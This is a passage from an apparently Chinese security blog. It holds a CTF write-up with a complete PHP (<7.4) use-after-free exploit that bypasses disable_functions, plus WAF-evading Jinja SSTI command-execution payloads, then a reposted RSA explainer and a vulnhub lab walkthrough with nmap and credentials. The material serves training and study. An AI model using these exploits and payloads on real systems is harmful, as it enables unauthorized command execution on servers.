<p><img src="/.com//5.png" alt="image-20200321091526102"></p>
<p>上php&lt;7.4的通杀shell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">pwn(<span class="string">"/readflag"</span>); <span class="comment">//这里是想要执行的系统命令</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span><span class="params">($cmd)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $abc, $helper;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span><span class="params">(&amp;$str, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($j = $s<span class="number">-1</span>; $j &gt;= <span class="number">0</span>; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span><span class="params">($ptr, $m = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $out = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= chr($ptr &amp; <span class="number">0xff</span>);</span><br><span class="line">            $ptr &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">(&amp;$str, $p, $v, $n = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">            $v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span><span class="params">($addr, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $abc, $helper;</span><br><span class="line">        write($abc, <span class="number">0x68</span>, $addr + $p - <span class="number">0x10</span>);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>($s != <span class="number">8</span>) &#123; $leak %= <span class="number">2</span> &lt;&lt; ($s * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span><span class="params">($base)</span> </span>&#123;</span><br><span class="line">        $e_type = leak($base, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, <span class="number">0x20</span>);</span><br><span class="line">        $e_phentsize = leak($base, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        $e_phnum = leak($base, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            $p_flags = leak($header, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            $p_vaddr = leak($header, <span class="number">0x10</span>);</span><br><span class="line">            $p_memsz = leak($header, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                $data_addr = $e_type == <span class="number">2</span> ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span><span class="params">($base, $elf)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $data_size / <span class="number">8</span>; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># 'constant' constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># 'bin2hex' constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $data_addr + $i * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span><span class="params">($binary_leak)</span> </span>&#123;</span><br><span class="line">        $base = <span class="number">0</span>;</span><br><span class="line">        $start = $binary_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span>; $i++) &#123;</span><br><span class="line">            $addr = $start - <span class="number">0x1000</span> * $i;</span><br><span class="line">            $leak = leak($addr, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span><span class="params">($basic_funcs)</span> </span>&#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($f_name == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> leak($addr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>($f_entry != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ryat</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $ryat;</span><br><span class="line">        <span class="keyword">var</span> $chtg;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;chtg = <span class="keyword">$this</span>-&gt;ryat;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ryat = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">'WIN'</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'This PoC is for *nix systems only.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line">    $contiguous = [];</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_repeat(<span class="string">'A'</span>, <span class="number">79</span>);</span><br><span class="line"></span><br><span class="line">    $poc = <span class="string">'a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:"ryat":2:&#123;s:4:"ryat";R:3;s:4:"chtg";i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;'</span>;</span><br><span class="line">    $out = unserialize($poc);</span><br><span class="line">    gc_collect_cycles();</span><br><span class="line"></span><br><span class="line">    $v = [];</span><br><span class="line">    $v[<span class="number">0</span>] = ptr2str(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">    <span class="keyword">unset</span>($v);</span><br><span class="line">    $abc = $out[<span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    $helper = <span class="keyword">new</span> Helper;</span><br><span class="line">    $helper-&gt;b = <span class="function"><span class="keyword">function</span> <span class="params">($x)</span> </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen($abc) == <span class="number">79</span> || strlen($abc) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"UAF failed"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    $closure_handlers = str2ptr($abc, <span class="number">0</span>);</span><br><span class="line">    $php_heap = str2ptr($abc, <span class="number">0x58</span>);</span><br><span class="line">    $abc_addr = $php_heap - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    write($abc, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write($abc, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    write($abc, <span class="number">0x10</span>, $abc_addr + <span class="number">0x60</span>);</span><br><span class="line">    write($abc, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't determine binary base address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't parse ELF header"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't get basic_functions address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't get zif_system address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    $fake_obj_offset = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x110</span>; $i += <span class="number">8</span>) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    write($abc, <span class="number">0x20</span>, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x68</span>, $zif_system); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 菜刀连接后，上传该shell到<code>/tmp</code>下</p>
<p><img src="/.com//6.png" alt="image-20200321092022104"></p>
<h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p>考点：SSTI通过字符串拼接绕过waf</p>
<p>参考：<a href="https://blog.csdn.net/qq_42181428/article/details/104474414?fps=1&amp;locationNum=2" target="_blank" rel="noopener">https://blog.csdn.net/qq_42181428/article/details/104474414?fps=1&amp;locationNum=2</a></p>
<p>测试存在SSTI：</p>
<p>在解密处，进行解密发现这里存在SSTI</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7+7&#125;&#125; ==&gt;  e3s3Kzd9fQ==</span><br></pre></td></tr></table></figure>

<p><img src="/.com//7.png" alt="image-20200324094433669"></p>
<p>通过报错发现部分源码</p>
<p><img src="/.com//8.png" alt="image-20200324094536023"></p>
<p>这里<code>waf()</code>过滤了大部分的关键词：<code>eval(),os,flag</code>等词</p>
<p>通过字符拼接绕过waf</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">''</span>.<span class="keyword">__class__</span>.__base__.__subclasses__()[<span class="number">131</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'ev'</span>+<span class="string">'al'</span>](<span class="string">'__im'</span>+<span class="string">'port__("o'</span>+<span class="string">'s").po'</span>+<span class="string">'pen("cat /this_is_the_fl'</span>+<span class="string">'ag.txt")'</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="string">''</span>.<span class="keyword">__class__</span>.__base__.__subclasses__()[<span class="number">77</span>].__init__.__globals__[<span class="string">'sys'</span>].modules[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'po'</span>+<span class="string">'pen'</span>](<span class="string">'cat /this_is_the_fl'</span>+<span class="string">'ag.txt'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/02/26/GYCTF2020/" data-id="ck8sqr5i6000dkou54xne7yca" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-RSA原理解析" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/02/25/RSA%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/" class="article-date">
  <time datetime="2020-02-25T15:37:24.000Z" itemprop="datePublished">2020-02-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/02/25/RSA%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/">RSA原理解析[转载]</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前几天的一个比赛，让我这个没怎么学过密码学，平时都只是套套脚本的人很受打击，决意好好研究一下RSA.希望在往后的比赛里，也能通过密码学拿拿分，顺便拓展一下知识面，以后吹牛有的吹….</p>
<h1 id="计算公钥和私钥"><a href="#计算公钥和私钥" class="headerlink" title="计算公钥和私钥"></a>计算公钥和私钥</h1><p>RSA中的公钥和私钥需要结合在一起工作。公钥用来对数据块加密，之后 ，只有对应的私钥才能用来解密。生成密钥时，需要遵循几个步骤以确保公钥和私钥的这种关系能够正常工作。这些步骤也确保没有实际方法能够从一个密钥推出另一个。</p>
<p>开始前，首先要选择两个大的素数，记为p和q。根据当今求解大数因子的技术水平，这两个数应该至少有200位，这们在实践中才可以认为是安全的。</p>
<p>然后，开始计算n:</p>
<p><strong>n = pq</strong></p>
<p>接下来，选择一个小的奇数e，它将成为公钥的一部分。选择e最需要考虑的重点是它与(p-1)(q-1)不能有相同的因子。换句话说，e与(p-1)(q-1)是互为素数关系的。比如，如果p=11而q=19，那么n=11 X 19=209。这里选择e=17，因为(p-1)(q-1)=10 X 18 =180，而17和180没有相同的因子。通常选择3、17、65、537作为e的值。使用这些值不会对RSA的安全性造成影响，因为解密数据还需要用到私钥。</p>
<p>一旦为e选择了一个值，接下来开始计算相对应的值d，d将成为私钥的一部分。d的值就是计算e的倒数对(p-1)(q-1)的取模结果，公式如下：</p>
<p><strong>d = e-1 mod (p-1)(q-1)</strong></p>
<p>这里d和e是模乘法逆元的关系。</p>
<p>思考一下这个问题：当d为多少时可以满足ed mod (p-1)(q-1) = 1 ?比如在等式 17d mod 180 = 1中，d的一个可能值是53。其他的可能值是233、413、593等。在实践中，可以利用欧几里德算法来计算模乘法逆元。这里就不再展开。</p>
<p>现在有了e和d的值，<strong>将(e,n)作为公钥P</strong>，<strong>将(d,n)作为私钥S</strong>并保持其不可见。表示为：</p>
<p><strong>P = (e,n) , S = (d,n)</strong></p>
<p>加密方使用P来加密数据，解密方使用S来解密。<strong>为了防止就算有人知道了P也无法推算出S，必须保证p和q的值绝对不能暴露</strong>。</p>
<p>P和S结合在一起提供的安全性来自于一个事实，那就是乘法是一种很好的单向函数。</p>
<p><strong>欧拉函数记为φ(n)，定义所有小于n的正整数里和n互素的整数的个数</strong>。</p>
<p>只有当两个整数的唯一公因子为1时，才说这两个整数是互素的。例如，φ（8）=4，因为一共只用4个比8小的整数是互素的，它们是1，3，5，7。</p>
<p>欧拉方程有<strong>两个性质</strong>对RSA算法来说是特别重要的。</p>
<p> 第一，当n是素数时，φ（n）=n-1。这是由于n的唯一因子是1和n，因此，n与之前的所有n-1个正整数都是互素的。</p>
<p>另一个有趣的性质是对于任意小于n且与n互素的正整数a，都有aφ(n) mod n = 1。例如，14 mod 8 = 1, 34 mod 8 = 1, 54 mod 8 = 1, 74 mod 8 = 1。对上述方程两边都乘以a，得到：</p>
<p><strong>(a)(aφ(n) mod n)=a，或者aφ(n)+1 mod n = a</strong></p>
<p>因此，可以得到15 mod 8 = 1, 35 mod 8 = 3, 55 mod 8 = 5, 75 mod 8 = 7。</p>
<p>调整之后得到的等式非常强大。<strong>因为对于某些等式c = me mod n，该等于可以让我们找出一个d的值，使得cd mod n = m。</strong></p>
<p>这就是RSA算法中允许加密数据，之后再解密回原文的恒等式。可以按照如下方式表示：</p>
<p><strong>cd mod n = (me)d mod n = med mod n = mφ(n)+1 mod n = m mod n</strong></p>
<p>欧拉函数和指数间的关系保证了加密的任意数据都能够唯一地解密回来。为了找出d的值，解方程d = e-1 φ(n) +1。不巧的是，对于方程d = e-1φ(n)+1不一定总是有整数解。为了解决这种问题，转而计算</p>
<p>d mod φ(n)的值。换句话说，d = (e-1 φ(n) + 1) mod φ(n)，可以简化为：</p>
<p><strong>d = e-1 mod φ(n)</strong></p>
<p>我们可以得到这样的简化形式，因为(φ(n)+1) mod φ(n) = (φ(n)+1) - φ(n) = 1。可以用任意的正整数替代φ(n)来证明等式成立。注意这个方程式同之前计算密钥的过程中得出d的推导式之间的相似之处。这提供了一种通过e和n来计算d的方法。当然了，e和n是公开的，对于攻击者来说是事先可知的，因此就有人问，这难道不是给了攻击者相同的机会来计算出私钥吗？讨论到这里，是时候来探讨一下RSA算法安全性保障的由来了。</p>
<p><strong>RSA算法的安全性保障来自一个重要的事实，那就是欧拉函数是乘法性质的</strong>。这意味着如果p和q是互素的，那么有φ(pq)=φ(p)φ(q)。因此，如果有两个素数p和q，且n=p*q，则φ(n)=(p-1)(q-1)，而且最重要的是：</p>
<p><strong>d = e-1 mod (p-1)(q-1)</strong></p>
<p><strong>因此，尽管攻击者可能知道了e和n的值，为了计算出d必须知道φ(n)，而这又必须同时得到p和q的值才能办到</strong>。由于p和q是不可知的，因此攻击者只能计算n的因子，只要给出的p和q的值足够大，这就是一个相当耗费时间的过程。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>参考:<a href="https://www.cnblogs.com/idreamo/p/9411265.html" target="_blank" rel="noopener"><a href="https://www.cnblogs.com/idreamo/p/9411265.html" target="_blank" rel="noopener">https://www.cnblogs.com/idreamo/p/9411265.html</a></a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/02/25/RSA%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/" data-id="ck8sqr5io000jkou5fc303qrl" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-pumpkinGarden-Raise-vulnhub渗透测试" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/02/25/pumpkinGarden-Raise-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="article-date">
  <time datetime="2020-02-25T14:03:32.000Z" itemprop="datePublished">2020-02-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/02/25/pumpkinGarden-Raise-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">pumpkinGarden&amp;Raise-vulnhub渗透测试</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>pumpkinGarden&amp;Raise-vulnhub渗透测试</p>
<p>靶机IP:192.168.1.160</p>
<p>攻击机IP:192.168.1.124</p>
<h1 id="pumpkinGarden渗透测试"><a href="#pumpkinGarden渗透测试" class="headerlink" title="pumpkinGarden渗透测试"></a>pumpkinGarden渗透测试</h1><p>nmap扫描</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p <span class="number">1</span><span class="number">-65535</span> -Pn -A <span class="number">192.168</span><span class="number">.1</span><span class="number">.160</span></span><br></pre></td></tr></table></figure>

<p>扫描的端口如下：</p>
<p><img src="/.com//1.png" alt="image-20200213233119035"></p>
<p>21端口可匿名登陆</p>
<p><img src="/.com//2.png" alt="image-20200213233354945"></p>
<p>然后未有其他信息了</p>
<p>接着再看1515端口</p>
<p><img src="/.com//3.png" alt="image-20200213233612836"></p>
<p>访问一下<code>img</code>目录,其中的<code>hidden_secret</code>中的<code>clue.txt</code></p>
<p><img src="/.com//4.png" alt="image-20200213233837054"></p>
<p>base64解码一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scarecrow : <span class="number">5</span>Qn@$y</span><br></pre></td></tr></table></figure>

<p><strong>尝试ssh连接，但是这里不是用22端口连接，所以要想到使用3535端口，这里开了ssh服务</strong></p>
<p><img src="/.com//5.png" alt="image-20200213234304501"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Reach out to goblin and share this "Y0n$M4sy3D1t" to secretly get keys from LordPumpkin.</span><br></pre></td></tr></table></figure>

<p>猜测账号密码是<code>goblin:Y0n$M4sy3D1t</code></p>
<p>然后登陆试试</p>
<p><img src="/.com//6.png" alt="image-20200214000258658"></p>
